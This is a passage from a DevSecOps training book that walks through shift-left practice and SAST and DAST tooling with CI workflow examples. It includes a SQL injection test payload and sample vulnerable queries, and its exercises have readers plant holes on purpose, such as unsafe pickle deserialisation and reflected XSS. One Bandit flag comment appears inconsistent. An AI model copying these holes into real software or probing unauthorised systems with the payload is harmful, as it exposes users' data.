


# DevSecOps & Supply Chain Security
### A Comprehensive Learning Book for Cloud & DevOps Engineers
#### Beginner to Advanced · Weeks 35–37

---

> *"Security is not a product, but a process."* — Bruce Schneier

---

## Table of Contents

1. [Introduction: Why DevSecOps Exists](#introduction)
2. [Chapter 1: Shift-Left Security](#chapter-1)
3. [Chapter 2: SAST — Static Application Security Testing](#chapter-2)
4. [Chapter 3: DAST — Dynamic Application Security Testing](#chapter-3)
5. [Chapter 4: SCA — Software Composition Analysis](#chapter-4)
6. [Chapter 5: Container Security](#chapter-5)
7. [Chapter 6: Secrets Scanning](#chapter-6)
8. [Chapter 7: The SLSA Framework](#chapter-7)
9. [Chapter 8: SBOM — Software Bill of Materials](#chapter-8)
10. [Chapter 9: Supply Chain Attacks](#chapter-9)
11. [Chapter 10: Infrastructure Security Scanning](#chapter-10)
12. [Chapter 11: Compliance as Code](#chapter-11)
13. [Chapter 12: Vulnerability Management](#chapter-12)
14. [Final Chapter: Connecting Everything](#final-chapter)

---

## Introduction: Why DevSecOps Exists {#introduction}

### The World Before Security Was Everyone's Job

Imagine a factory that builds cars. The assembly line moves fast — doors go on, engines are installed, dashboards are fitted. At the very end of the line, just before the cars roll off to the showroom, a single inspector checks every car for safety issues. If the inspector finds something wrong — a faulty brake line, a missing seatbelt anchor — the car has to go all the way back to the beginning of the line to be fixed.

This is how software security used to work. A team of security experts would sit at the end of the development process, waiting for the finished product to arrive. They'd poke at it, find vulnerabilities, file a report, and hand it back to developers who had long since moved on to the next project. Fixing those issues was expensive, slow, and often incomplete.

Now imagine a smarter factory: every worker on the assembly line is also trained in safety. The person fitting the doors checks the hinges are safe. The person installing the engine verifies the fuel lines are sealed. Safety isn't something that happens at the end — it's baked into every single step. Issues are caught in seconds, not weeks.

That is the philosophy of **DevSecOps**.

### What Is DevSecOps?

**DevSecOps** stands for **Development, Security, and Operations**. It is the practice of integrating security into every phase of the software development lifecycle (SDLC) — not treating it as an afterthought or a gate at the end.

- **Dev** = Writing code, building features
- **Sec** = Making that code safe, scanning for vulnerabilities, managing risk
- **Ops** = Deploying, running, and monitoring software in production

Before DevSecOps, these three functions existed in silos. Developers wanted to ship fast. Security teams wanted to slow things down to check everything. Operations teams wanted stability. DevSecOps tears down those silos by making security the shared responsibility of everyone on the team, supported by automated tooling that runs alongside the development process.

### What Is Supply Chain Security?

A software supply chain is everything that goes into building your application — not just the code you write yourself, but:

- Open-source libraries and packages you import (npm, pip, Maven, etc.)
- Third-party services your app connects to
- The tools and pipelines used to build and deploy your code
- The container base images your application runs inside
- The infrastructure definitions (Terraform, Helm charts) that provision your cloud resources

The **SolarWinds attack of 2020** showed the world how devastating a compromised supply chain can be. Attackers didn't break into thousands of companies directly — they poisoned the *build process* of a trusted software vendor, which then distributed malware to 18,000 organisations including US government agencies. The entry point wasn't a login page or an API — it was the software factory itself.

**Supply chain security** is about protecting every link in this chain.

### What You Will Learn in This Book

This book takes you from zero to job-ready across the full landscape of DevSecOps and supply chain security. Here is what you will be able to do by the end:

- Integrate automated security scanning into CI/CD pipelines that blocks dangerous code before it ever merges
- Detect vulnerabilities in open-source dependencies and fix them before they reach production
- Scan container images and harden Dockerfiles against known attack vectors
- Prevent secrets (API keys, passwords, tokens) from leaking into your repositories
- Generate and manage Software Bills of Materials (SBOMs) to know exactly what is inside your software
- Achieve SLSA compliance to prove your builds are tamper-resistant
- Write infrastructure-as-code that is secure by default
- Build a full vulnerability management workflow used by real enterprise security teams
- Write security policies that govern how your organisation builds software

Each chapter builds on the last. By the final chapter, you will see how all these tools and practices combine into a coherent, automated security posture that runs invisibly alongside your development workflow.

Let's begin.

---

## Chapter 1: Shift-Left Security — Integrating Security at Every SDLC Stage {#chapter-1}

### The Traditional Way (And Why It Fails)

Think about a school essay. If your teacher only reads it after you've handed it in for grading, and then tells you it's structured incorrectly, you've lost valuable marks that you could have avoided. But if a friend reads your draft on day one and says "your thesis paragraph is weak," you can fix it immediately — at zero cost.

Software security works the same way. The later in the process you find a vulnerability, the more expensive it is to fix:

| Stage of Discovery | Relative Cost to Fix |
|---|---|
| During design | 1x |
| During coding | 6x |
| During testing | 15x |
| After deployment | 100x |
| After a breach | Incalculable |

These figures, originally from IBM's Systems Sciences Institute, are cited widely in the industry and remain directionally accurate today. Finding a SQL injection vulnerability in a design review costs almost nothing. Finding it after hackers have exfiltrated your user database costs you lawyers, regulators, reputation, and customers.

**Shifting left** means moving security checks earlier — "left" on a timeline that runs from design on the left to production on the right.

### The Software Development Lifecycle (SDLC)

Before we shift security, let's understand what we're shifting it into. The SDLC is the structured process of building software:

```
Plan → Design → Develop → Test → Deploy → Monitor
```

In a traditional waterfall model, these phases happen sequentially. In modern DevOps, they happen in rapid, overlapping cycles. **DevSecOps adds a security dimension to each phase**:

```
Plan        → Threat modelling, security requirements
Design      → Architecture review, secure design patterns
Develop     → SAST, secrets scanning, IDE security plugins
Test        → DAST, SCA, container scanning
Deploy      → Signed builds, SBOM, infra-as-code scanning
Monitor     → Runtime security, anomaly detection, alerting
```

### What Shift-Left Looks Like in Practice

Let's walk through a real scenario. A developer is building a new feature that accepts user input and stores it in a database.

**Without shift-left:**
1. Developer writes the code with a SQL injection vulnerability
2. Code gets merged, deployed to staging
3. Weeks later, a penetration test finds the injection
4. A ticket is raised, a developer has to context-switch back to old code
5. Fix is written, reviewed, merged, deployed again
6. Total time: 3–4 weeks. Cost: high.

**With shift-left:**
1. Developer writes the code
2. A SAST tool (like Semgrep) runs automatically on every commit and flags the injection *in seconds*
3. The CI pipeline rejects the pull request
4. Developer sees the error, fixes it before it even leaves their local branch
5. Total time: 5 minutes. Cost: negligible.

### The Key Practices of Shift-Left Security

**1. Security in the IDE**

Modern IDEs (VS Code, IntelliJ, etc.) support security plugins that analyse code as you type. Tools like Snyk's IDE plugin, SonarLint, or Semgrep's VS Code extension give real-time feedback — like spellcheck, but for vulnerabilities.

**2. Pre-commit Hooks**

A **pre-commit hook** is a script that runs automatically before a `git commit` is finalised. If the script fails, the commit is rejected. This is a perfect place to run fast security checks:

```bash
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        # Runs on every git commit attempt
        # If secrets are detected, the commit is blocked
```

Every line explained:
- `repos:` — the list of hook repositories to pull from
- `repo:` — the URL of the tool's repository
- `rev:` — the version of the tool to use
- `hooks:` — which specific hooks from that repo to activate
- `id:` — the name of the specific hook

**3. Security in Pull Requests (PRs)**

When a developer opens a PR to merge their code, automated checks run. This is where tools like Semgrep, Snyk, and CodeQL integrate. If a security check fails, the PR is blocked until it's fixed. No human approval required — the policy is enforced automatically.

**4. Security in CI/CD Pipelines**

The CI/CD pipeline is the automated system that builds, tests, and deploys code. Every tool in this book integrates here. Think of it as the assembly line — and security checks are stations on that line that every piece of code must pass through.

**5. Security in Deployment**

Before code reaches production, deployment pipelines can verify that:
- The container image being deployed has been scanned and signed
- Infrastructure changes have been reviewed against security policies
- The SBOM (the list of every component) has been recorded

### Threat Modelling: Security Starts Before a Line of Code

Shift-left also means thinking about security before writing code at all. **Threat modelling** is the practice of systematically asking: "What could go wrong with this feature, and how would an attacker exploit it?"

The most common framework is **STRIDE**, developed by Microsoft:

| Letter | Threat Type | Example |
|---|---|---|
| S | Spoofing | Logging in as someone else |
| T | Tampering | Modifying data in transit |
| R | Repudiation | Denying you performed an action |
| I | Information Disclosure | Leaking sensitive data |
| D | Denial of Service | Making the service unavailable |
| E | Elevation of Privilege | Gaining admin access |

A threat model doesn't have to be a formal document. A whiteboard session at the start of a sprint, asking "what are the ways this feature could be abused?" — that's threat modelling.

### Common Beginner Mistakes

**Mistake 1: "We'll add security later."**
Later never comes. Features pile up, deadlines press, and "later" becomes "never." Security must be automated so it runs without anyone having to remember to do it.

**Mistake 2: Treating security as a blocker.**
Security checks should be fast (seconds, not minutes) and precise (few false positives). A pipeline that takes 20 minutes and flags 100 false positives will be disabled by frustrated developers within a week.

**Mistake 3: Ignoring security findings.**
Some teams configure security tools but suppress all the alerts. This gives the appearance of security without the substance. Build a triage process — not every finding is critical, but every finding deserves a decision.

**Mistake 4: Only securing the application code.**
Modern applications are 90% dependencies. Shift-left security must cover your dependencies (SCA), your containers (image scanning), your infrastructure (IaC scanning), and your secrets — not just your application code.

### How This Works in the Real World

At companies like Netflix, Google, and Shopify, shift-left security is embedded so deeply into developer workflows that most developers rarely think about it consciously. When a developer opens a PR at these companies:

- SAST tools scan for code vulnerabilities automatically
- Dependency scanners check every imported library
- Secrets scanners verify no credentials were committed
- Container scanners check any modified Dockerfiles
- Infrastructure scanners validate any Terraform changes

All of this happens in under 5 minutes on a typical PR, and results appear inline in the GitHub PR interface. Developers see findings alongside their code — no security portal to log into, no separate process.

The result: security defects are caught in seconds by the person best positioned to fix them — the developer who just wrote the code.

### Key Takeaways

- Shift-left means moving security earlier in the development process, not adding it at the end
- The earlier a vulnerability is found, the cheaper it is to fix — by orders of magnitude
- Shift-left is enabled by automation: IDE plugins, pre-commit hooks, CI/CD integration
- Threat modelling (using frameworks like STRIDE) embeds security thinking before code is written
- Security must be fast, precise, and invisible to be adopted by developers

### Practical Task: Design a Shift-Left Security Map

**Task:** For a web application with a Python Flask backend and React frontend, stored in GitHub and deployed via GitHub Actions to AWS ECS:

1. Draw (or write out) a SDLC diagram for this application
2. For each stage (Plan, Develop, PR/Review, CI/CD, Deploy, Monitor), list at least two security checks that should run
3. Write a threat model for a single feature: a user registration form that accepts email and password
4. Write a one-paragraph justification for *why* each security check belongs at the stage you chose it

**Expected output:** A document showing your SDLC with security controls mapped to each stage, plus a STRIDE threat model for the registration feature. This exercise mirrors what security engineers do when onboarding a new product — mapping the existing SDLC and identifying where security gates are missing.

---

## Chapter 2: SAST — Static Application Security Testing {#chapter-2}

### What Is SAST? An Analogy First

Imagine you are a building inspector, but instead of visiting finished buildings, you inspect the *blueprints*. You never actually enter a building — you read the plans and identify problems: "this staircase doesn't meet fire code," "this electrical layout will cause a short circuit," "this load-bearing wall is missing."

**Static Application Security Testing (SAST)** does this for code. It analyses your source code, byte code, or compiled artifacts *without running the application*. It reads the code like an expert reviewer, looking for patterns that indicate security vulnerabilities: SQL injection, cross-site scripting (XSS), hardcoded credentials, insecure cryptography, and hundreds more.

"Static" = the code is not executing. You're reading the blueprint, not walking through the building.

### How SAST Works Under the Hood

SAST tools build an abstract representation of your code and then apply rules (called "patterns" or "rules" or "queries") against that representation. There are two main approaches:

**1. Pattern Matching (Semgrep)**
Semgrep converts code into an abstract syntax tree (AST) — a tree structure representing the grammar of your code — and then matches patterns against it. A rule might say: "find any place where user input flows into a SQL query without sanitisation."

**2. Data Flow Analysis (CodeQL)**
More sophisticated tools like CodeQL track how data flows through your application. They can trace a value from the moment it enters (e.g., an HTTP request parameter) through every function it passes through, until it reaches a dangerous sink (e.g., a database query). This catches vulnerabilities that simple pattern matching misses.

### Tool 1: Semgrep

**Semgrep** (short for "semantic grep") is one of the most powerful and developer-friendly SAST tools available. It supports 30+ languages and comes with thousands of open-source rules.

**Installation:**
```bash
# Install via pip
pip install semgrep

# Verify installation
semgrep --version
```

**Running your first scan:**
```bash
# Scan the current directory using the default ruleset
semgrep --config=auto .

# This command means:
# semgrep       — run the Semgrep scanner
# --config=auto — automatically download appropriate rules for the languages detected
# .             — scan the current directory (recursively)
```

**Running with a specific ruleset:**
```bash
# Run only the OWASP Top 10 rules
semgrep --config=p/owasp-top-ten .

# Run Python-specific security rules
semgrep --config=p/python .

# Run rules for CI/CD (checks for secrets, insecure configs)
semgrep --config=p/ci .
```

**Understanding output:**
```
/app/auth/login.py
  rule: python.django.security.injection.sql.django-rawsql-injection
  severity: ERROR
  line 24: cursor.execute("SELECT * FROM users WHERE email = '" + email + "'")
  
  This SQL query is constructed by string concatenation. Use parameterised queries instead.
```

Every line explained:
- `/app/auth/login.py` — the file where the vulnerability was found
- `rule:` — the ID of the rule that triggered
- `severity: ERROR` — how serious this finding is (ERROR, WARNING, INFO)
- `line 24:` — the exact line of code
- The message — a human-readable explanation of the problem

**Writing a custom Semgrep rule:**

Semgrep rules are written in YAML:

```yaml
rules:
  - id: no-print-sensitive-data
    # The pattern to look for in the code
    patterns:
      - pattern: print($X)
      - pattern-either:
        - pattern: print(..., password, ...)
        - pattern: print(..., secret, ...)
        - pattern: print(..., token, ...)
    # The message shown when this rule fires
    message: |
      Potentially printing sensitive data to stdout.
      Use a logger with appropriate log levels instead.
    # The severity of this finding
    severity: WARNING
    # Which language(s) this rule applies to
    languages: [python]
```

Every line explained:
- `rules:` — starts the list of rules in this file
- `id:` — a unique name for the rule
- `patterns:` — the code patterns to match. All patterns must match (AND logic)
- `pattern:` — a single code pattern. `$X` is a metavariable (matches anything)
- `pattern-either:` — any of these patterns can match (OR logic)
- `message:` — the text shown to the developer when the rule fires
- `severity:` — ERROR blocks CI, WARNING is informational
- `languages:` — the programming languages this rule targets

### Tool 2: Bandit (Python)

**Bandit** is a SAST tool specifically for Python. It's simpler than Semgrep but excellent for Python codebases and widely used in Python security pipelines.

**Installation:**
```bash
pip install bandit
```

**Running Bandit:**
```bash
# Scan a single file
bandit auth/login.py

# Scan a directory recursively
bandit -r ./app

# Only show HIGH severity issues
bandit -r ./app -l -i
# -l = only low confidence and above
# -i = only medium and high impact

# Output as JSON (for CI/CD integration)
bandit -r ./app -f json -o bandit-results.json
```

**Sample Bandit output:**
```
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection via string-based query construction.
   Severity: MEDIUM   Confidence: MEDIUM
   Location: app/models.py:45
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html
44    def get_user(email):
45        return db.execute("SELECT * FROM users WHERE email='" + email + "'")
```

**Bandit test IDs:** Every Bandit rule has an ID like `B608`. You can skip specific rules in false positive cases:

```bash
# Skip specific test IDs
bandit -r ./app --skip B101,B601
# B101 = assert_used (often a false positive)
# B601 = paramiko_calls (if you're doing legitimate SSH automation)
```

### Tool 3: ESLint Security Plugin (JavaScript/TypeScript)

For JavaScript and TypeScript, **ESLint** is the standard linter, and the `eslint-plugin-security` adds security-focused rules.

**Installation:**
```bash
npm install --save-dev eslint eslint-plugin-security
```

**Configuration (`.eslintrc.json`):**
```json
{
  "plugins": ["security"],
  "extends": ["plugin:security/recommended"],
  "rules": {
    "security/detect-sql-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "error"
  }
}
```

Every line explained:
- `"plugins": ["security"]` — loads the security plugin
- `"extends": ["plugin:security/recommended"]` — enables the recommended set of security rules
- `"security/detect-sql-injection": "error"` — makes SQL injection a build-breaking error
- `"security/detect-non-literal-regexp"` — warns when regular expressions are built from variables (regex injection risk)
- `"security/detect-object-injection"` — warns when object properties are accessed using variables
- `"security/detect-possible-timing-attacks"` — warns about comparisons that could leak secrets via timing

**Running ESLint:**
```bash
# Scan all JavaScript files
npx eslint src/

# Fix automatically-fixable issues
npx eslint src/ --fix

# Output in a format readable by CI systems
npx eslint src/ --format json -o eslint-results.json
```

### Tool 4: SonarQube

**SonarQube** is an enterprise-grade SAST platform. Unlike Semgrep or Bandit (which run from the command line), SonarQube is a server application that stores scan results over time, tracks trends, and enforces **Quality Gates** — rules that determine whether a build passes or fails based on security findings.

**Running SonarQube locally with Docker:**
```bash
# Start SonarQube server
docker run -d --name sonarqube \
  -p 9000:9000 \
  sonarqube:community

# The flags explained:
# -d            = run in background (detached mode)
# --name        = give the container a name
# -p 9000:9000  = map port 9000 on your machine to port 9000 in the container
```

**Running a scan with sonar-scanner:**
```bash
sonar-scanner \
  -Dsonar.projectKey=my-app \
  -Dsonar.sources=. \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=your-token

# Flags explained:
# -Dsonar.projectKey   = unique identifier for your project in SonarQube
# -Dsonar.sources      = which directory to scan
# -Dsonar.host.url     = where the SonarQube server is running
# -Dsonar.login        = authentication token for the SonarQube server
```

**Quality Gates:** A Quality Gate in SonarQube is a set of conditions that must be met for a build to be marked as passing. Example conditions:
- No new vulnerabilities with severity CRITICAL or BLOCKER
- Security Hotspot review coverage > 80%
- No new code smells with effort > 30 minutes

### Tool 5: CodeQL

**CodeQL** is GitHub's SAST engine and is free for open-source repositories. It is more powerful than pattern-matching tools because it uses data flow analysis — it can trace tainted data through your entire codebase.

**Setting up CodeQL in GitHub Actions:**

```yaml
# .github/workflows/codeql.yml

name: CodeQL Security Analysis

on:
  push:
    branches: [main, develop]  # Run on pushes to main and develop
  pull_request:
    branches: [main]           # Run on PRs targeting main

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest

    strategy:
      matrix:
        language: ['python', 'javascript']
        # Scan both Python and JavaScript code

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        # Check out the code so CodeQL can scan it

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          # Tell CodeQL which language to analyse

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3
        # CodeQL builds the code to understand its structure

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        # Run the actual analysis and upload results to GitHub Security tab
```

Every section explained:
- `on: push/pull_request:` — when to trigger the workflow
- `strategy: matrix:` — run the job multiple times, once per language
- `actions/checkout@v4` — clone the repository
- `codeql-action/init` — set up the CodeQL environment
- `codeql-action/autobuild` — automatically build the project (needed for compiled languages)
- `codeql-action/analyze` — run queries and upload results to GitHub's Security Alerts

### Integrating Semgrep into GitHub Actions

Here is a complete, production-ready GitHub Actions workflow for Semgrep:

```yaml
# .github/workflows/semgrep.yml

name: Semgrep Security Scan

on:
  pull_request: {}          # Run on every pull request
  push:
    branches: [main]        # Also run on main branch pushes
  schedule:
    - cron: '0 0 * * 1'    # Run every Monday at midnight (weekly full scan)

jobs:
  semgrep:
    name: SAST with Semgrep
    runs-on: ubuntu-latest

    container:
      image: semgrep/semgrep
      # Run inside the official Semgrep Docker image

    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep
        run: |
          semgrep ci \
            --config=auto \
            --error \
            --json-output=semgrep-results.json
        # semgrep ci    = CI-optimised mode (only scans changed files in PRs)
        # --config=auto = download appropriate rules automatically
        # --error       = exit with non-zero code if any findings are detected
        # --json-output = write results to a file for processing
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}
          # Optional: connect to Semgrep Cloud Platform for dashboards

      - name: Upload results as artifact
        uses: actions/upload-artifact@v4
        if: always()         # Upload even if the scan failed
        with:
          name: semgrep-results
          path: semgrep-results.json
```

### Common Beginner Mistakes

**Mistake 1: Running SAST on everything, every time.**
Running a full SAST scan on the entire codebase for every commit is slow. Use tools like Semgrep's `ci` mode, which only scans files changed in the PR. Run full scans weekly on a schedule.

**Mistake 2: Not tuning for false positives.**
Every SAST tool generates false positives — findings that look like vulnerabilities but aren't. A codebase that reports 500 false positives will have developers ignoring all findings. Invest time in tuning rules and creating suppression comments for legitimate false positives:

```python
# nosemgrep: python.django.security.injection.sql.django-rawsql-injection
# This query is safe because parameters are sanitised by the ORM layer
cursor.execute(safe_raw_query, params)
```

**Mistake 3: Treating SAST as a silver bullet.**
SAST cannot find all vulnerabilities. It cannot find authentication logic flaws, business logic bugs, or issues that only appear at runtime. SAST is one layer in a defence-in-depth strategy.

**Mistake 4: Ignoring severity levels.**
Not all findings are equal. Prioritise HIGH and CRITICAL findings. LOW findings can be addressed in batches. If you block PRs on all severity levels, developers will disable the tool.

### How This Works in the Real World

At a company like Airbnb or Stripe, SAST is configured to:
- Run automatically on every PR, scanning only changed files (fast)
- Block merges on HIGH and CRITICAL findings
- Post inline comments on the PR showing exactly where the vulnerability is
- Run a full weekly scan of the entire codebase
- Feed results into a central security dashboard for tracking trends over time

Security teams maintain a catalogue of suppression rules for known false positives and custom rules for the company's specific frameworks and coding patterns.

### Key Takeaways

- SAST analyses source code without running it — finding vulnerabilities at the "blueprint" stage
- Semgrep is pattern-based, fast, and highly configurable — ideal for CI integration
- Bandit is Python-specific and excellent for focused Python security audits
- ESLint Security Plugin extends standard JavaScript linting with security rules
- SonarQube provides enterprise-grade dashboards, trend tracking, and quality gates
- CodeQL uses data flow analysis to catch complex vulnerabilities that pattern matching misses
- Tune SAST rules to reduce false positives — a high-noise tool gets turned off

### Practical Task: Integrate Semgrep into GitHub Actions — Block PRs with HIGH Severity Findings

**Task:**

1. Create a new GitHub repository (or use an existing one) with a simple Python Flask application
2. Intentionally introduce at least three security vulnerabilities:
   - A SQL injection (string concatenation in a query)
   - A hardcoded secret (e.g., `SECRET_KEY = "mysecretkey"`)
   - An insecure deserialization (`pickle.loads(user_input)`)
3. Create `.github/workflows/semgrep.yml` using the template from this chapter
4. Configure Semgrep to:
   - Run on all pull requests
   - Use `p/python` and `p/owasp-top-ten` rulesets
   - Block PRs with HIGH or ERROR severity findings
   - Output results as JSON and upload as a pipeline artifact
5. Open a PR with the vulnerable code and verify that Semgrep blocks the merge
6. Fix the three vulnerabilities and verify the PR now passes

**Expected output:** A GitHub repository with a working Semgrep workflow, a screenshot or log showing a blocked PR due to security findings, and a second log showing the PR passing after fixes. Document each vulnerability you introduced and how Semgrep detected it.

---

## Chapter 3: DAST — Dynamic Application Security Testing {#chapter-3}

### The Difference Between SAST and DAST: A New Analogy

In the last chapter, we said SAST is like inspecting blueprints. DAST is like hiring a burglar to try to break into your finished house — while it's standing, with the lights on and the locks engaged.

**Dynamic Application Security Testing (DAST)** tests a *running application* by sending it real HTTP requests designed to trigger vulnerabilities. It doesn't read your code. It acts like an attacker: probing endpoints, fuzzing inputs, manipulating cookies and headers, and looking for responses that indicate a vulnerability.

"Dynamic" = the application is executing. You're testing the real building, not the blueprint.

This means DAST finds a different class of vulnerabilities than SAST:
- **SAST** finds code-level issues (SQL injection, insecure functions)
- **DAST** finds runtime issues (authentication bypasses, misconfigurations, exposed admin panels, SSL/TLS weaknesses)

A mature security posture needs both.

### Tool 1: OWASP ZAP (Zed Attack Proxy)

**OWASP ZAP** is the most widely used open-source DAST tool in the world. It was built and is maintained by the Open Web Application Security Project (OWASP) — the same organisation behind the OWASP Top 10 list of web application vulnerabilities.

ZAP works as a **proxy** — it sits between your browser (or test client) and the application you're testing. All traffic passes through it, and ZAP analyses it for vulnerabilities.

**Key ZAP scanning modes:**

| Mode | What it does | Use case |
|---|---|---|
| Spider | Crawls the application to discover all URLs | Mapping the attack surface |
| AJAX Spider | Crawls JavaScript-heavy single-page apps | React, Vue, Angular apps |
| Active Scan | Attacks every discovered URL with vulnerability probes | Full vulnerability scan |
| Passive Scan | Analyses traffic without sending additional requests | Safe scan with no side effects |

**Running ZAP in CI with Docker:**

```bash
# Run ZAP baseline scan (passive scan, safe for CI)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://your-staging-app.example.com \
  -r zap-report.html

# Flags explained:
# -t = target URL (your application's base URL)
# -r = output report file name (HTML format)
```

**Running a full active scan (more comprehensive but sends attack traffic):**

```bash
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://your-staging-app.example.com \
  -r zap-full-report.html \
  -J zap-full-report.json \
  -I

# Additional flags:
# -J = also output a JSON report
# -I = ignore failures (don't exit with non-zero on findings; useful when tracking over time)
```

**ZAP API scan (for REST APIs with an OpenAPI spec):**

```bash
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://your-app.example.com/api/openapi.json \
  -f openapi \
  -r zap-api-report.html

# -f openapi = specifies the API definition format
# -t         = URL of the OpenAPI/Swagger specification
```

**Understanding ZAP output:**

ZAP findings are categorised by risk level:
- **High** — Vulnerabilities that allow an attacker to compromise the application or its data (SQL injection, command injection)
- **Medium** — Vulnerabilities that require additional exploitation steps (XSS, CSRF missing)
- **Low** — Weaknesses that reduce security posture (missing security headers, verbose error messages)
- **Informational** — Notes for the developer (cookie without HttpOnly flag)

**GitHub Actions integration:**

```yaml
# .github/workflows/dast.yml

name: DAST Scan with OWASP ZAP

on:
  push:
    branches: [main]
  schedule:
    - cron: '0 2 * * *'   # Run nightly at 2am

jobs:
  dast:
    name: DAST with ZAP
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Start application
        run: |
          docker compose up -d
          sleep 10  # Wait for the app to be fully started
        # Start your application in Docker so ZAP has something to scan

      - name: Run ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.11.0
        with:
          target: 'http://localhost:8080'
          # The URL of your running application
          rules_file_name: '.zap/rules.tsv'
          # Optional: a file that configures which rules to enable/disable
          cmd_options: '-a'
          # -a = include alpha (experimental) passive scan rules

      - name: Upload ZAP Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: zap-report
          path: report_html.html
```

### Tool 2: Burp Suite Community Edition

**Burp Suite** is the industry-standard tool for professional web application penetration testing. The Community Edition is free and powerful for manual testing.

Unlike ZAP (which you automate), Burp Suite shines as a *manual* testing tool. You configure your browser to route traffic through Burp, then interact with the application normally. Burp captures every request and response, and you can:

- Modify requests in real-time before they're sent
- Replay requests with different parameters
- Brute-force login forms
- Fuzz inputs with the Intruder module
- Intercept and modify API calls

**Setting up Burp Suite as a proxy:**

1. Open Burp Suite, go to **Proxy** → **Options**
2. Verify it's listening on `127.0.0.1:8080`
3. Configure your browser to use `127.0.0.1:8080` as its HTTP proxy
4. Install Burp's CA certificate in your browser (to intercept HTTPS)
5. Now browse your application — all traffic appears in Burp's **HTTP History** tab

**Manual testing with Burp: Testing for SQL injection**

1. Find a request that sends user input to the server (e.g., a search form)
2. Right-click the request → **Send to Repeater**
3. In Repeater, modify the parameter to contain SQL metacharacters: `' OR 1=1 --`
4. Click **Send** and examine the response
5. If the response changes unexpectedly (returns all results, shows an error), SQL injection is likely

### Tool 3: Nuclei

**Nuclei** is a fast, template-based vulnerability scanner built by ProjectDiscovery. It is especially popular for scanning APIs and cloud infrastructure.

Unlike ZAP (which is a general-purpose web app scanner), Nuclei uses a massive library of community-contributed templates — YAML files that describe specific vulnerabilities. If a new CVE is published, a Nuclei template is usually available within hours.

**Installation:**
```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Or via brew on macOS
brew install nuclei

# Update templates to the latest version
nuclei -update-templates
```

**Running Nuclei:**
```bash
# Basic scan against a target
nuclei -u https://your-app.example.com

# Scan using only a specific severity level
nuclei -u https://your-app.example.com -severity high,critical

# Scan an API with authentication
nuclei -u https://api.example.com \
  -H "Authorization: Bearer your-token" \
  -t nuclei-templates/http/

# Flags:
# -u      = target URL
# -H      = add a custom HTTP header (for authenticated scans)
# -t      = path to templates directory
# -severity = only run templates of this severity

# Output results to JSON
nuclei -u https://your-app.example.com -j -o nuclei-results.json
# -j = JSON output
# -o = output file
```

**Writing a custom Nuclei template:**

```yaml
id: custom-admin-panel-exposed

info:
  name: Admin Panel Exposed
  author: yourname
  severity: high
  description: Checks for an exposed admin panel at /admin

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/login"
    # {{BaseURL}} is automatically replaced with the target URL

    matchers-condition: and
    # All matchers must match (AND logic)

    matchers:
      - type: status
        status: [200]
        # The response code must be 200 (not redirected to login)

      - type: word
        words:
          - "Administrator"
          - "Admin Panel"
        # The response body must contain these words
```

Every line explained:
- `id:` — unique identifier for this template
- `info:` — metadata: name, author, severity, description
- `http:` — the HTTP requests to make
- `method: GET` — the HTTP method
- `path:` — the URLs to test (appended to the base URL)
- `{{BaseURL}}` — a variable automatically replaced with the target
- `matchers-condition: and` — all matchers must be true for a finding
- `matchers:` — conditions that determine if the vulnerability is present
- `type: status` — a matcher that checks the HTTP response code
- `type: word` — a matcher that checks for specific text in the response

### DAST in CI/CD: The Golden Rule

DAST sends real attack traffic to a real application. **Never run DAST against production.** Always run it against a dedicated staging or ephemeral test environment.

Best practice workflow:
1. Deploy the app to a temporary test environment as part of the CI pipeline
2. Run DAST scans against this test environment
3. Collect and process results
4. Tear down the test environment
5. Block the deploy to production if HIGH findings exist

### Common Beginner Mistakes

**Mistake 1: Running DAST against production.**
Active DAST scans can overload a server, trigger security alerts, corrupt data, or inadvertently exploit vulnerabilities. Always use a dedicated test environment.

**Mistake 2: Using only the baseline/passive scan.**
The ZAP baseline scan is safe but superficial. A passive scan can only observe traffic — it cannot probe for SQL injection or XSS. Use active scans in test environments for real security coverage.

**Mistake 3: Not authenticating the scanner.**
If your application requires login, an unauthenticated scan only tests the login page. Configure your DAST tool to authenticate before scanning.

**Mistake 4: Scanning once and forgetting.**
Vulnerabilities are introduced with every code change. DAST should run regularly — ideally nightly against the latest staging build.

### How This Works in the Real World

Enterprise security teams typically run DAST in two ways:

1. **Automated nightly scans:** ZAP or Nuclei runs against the staging environment every night. Results are compared to the previous scan. New findings trigger tickets in Jira or GitHub Issues automatically.

2. **Manual penetration testing:** Once or twice a year, human security engineers use Burp Suite to deeply test the application. They look for business logic flaws, chained vulnerabilities, and edge cases that automated tools miss.

### Key Takeaways

- DAST tests running applications by sending real attack traffic — complementary to SAST, not a replacement
- OWASP ZAP is the leading open-source DAST tool with strong CI/CD integration
- Burp Suite Community Edition is essential for manual penetration testing
- Nuclei uses templates for fast, targeted scanning — ideal for known CVEs and specific checks
- Never run active DAST against production — always use isolated test environments
- DAST must be authenticated to provide meaningful coverage of protected endpoints

### Practical Task: Run OWASP ZAP in CI Against Your App API — Document and Fix All HIGH/MEDIUM Findings

**Task:**

1. Set up a simple REST API with at least the following intentional vulnerabilities:
   - Missing security headers (`X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`)
   - An endpoint that reflects user input without sanitisation (reflected XSS)
